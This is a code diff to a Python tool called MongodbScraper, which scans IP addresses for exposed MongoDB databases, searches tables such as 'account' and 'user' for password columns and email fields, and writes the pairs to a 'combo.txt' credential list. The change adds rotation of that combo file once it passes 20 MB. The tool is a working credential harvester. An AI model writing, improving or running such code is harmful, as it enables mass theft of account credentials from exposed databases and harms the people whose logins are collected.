@@ -21,6 +21,7 @@ class MongodbScraper:
         self.table_names = ['account', 'user', 'subscriber', 'customer']
         self.column_names = ['pass', 'pwd']
         self.email_regex = re.compile(r'[a-z0-9\-\._]+@[a-z0-9\-\.]+\.[a-z]{2,4}')
+        self.filename = 'combo.txt'
 
         # Init the logger
         self.logger = logging.getLogger('mongodb-scraper')
@@ -133,6 +134,23 @@ Rows: {2}
         except smtplib.SMTPException:
             return
 
+    def _check_datafile(self):
+        size = 0
+
+        if os.path.exists('data/' + self.filename):
+            size = os.path.getsize('data/' + self.filename)
+
+        # Did the file grow too large?
+        if size > (20 * 1024 * 1024):
+            i = 0
+            while i < 100:
+                i += 1
+
+                combo_file = 'combo_' + str(i) + '.txt'
+                if not os.path.exists('data/' + combo_file):
+                    self.filename = combo_file
+                    break
+
     def scrape(self):
         for ip in self.ips:
             # Do I have already processed this IP?
@@ -205,6 +223,9 @@ Rows: {2}
 
                     self.logger.info("** Table with interesting data found")
 
+                    # Check if the current data file is too large
+                    self._check_datafile()
+
                     # Ok there is interesting data inside it. Let's find if there is an email address, too
                     # I'll just check the first record and hope there is something similar to an email address.
                     email_field = ''
@@ -268,13 +289,13 @@ Rows: {2}
                             # If I get a very long list, let's write it in batches
                             if len(lines) >= 1000:
                                 self.logger.info("\t\tWriting " + str(counter) + "/" + str(total) + " records")
-                                with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
+                                with io.open('data/' + self.filename, 'a', encoding='utf-8') as fp_pass:
                                     fp_pass.writelines(lines)
                                     lines = []
                     except mongo_errors.ExecutionTimeout:
                         self.logger.warning("Cursor timed out, skipping")
 
-                    with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
+                    with io.open('data/' + self.filename, 'a', encoding='utf-8') as fp_pass:
                         fp_pass.writelines(lines)
 
             client.close()
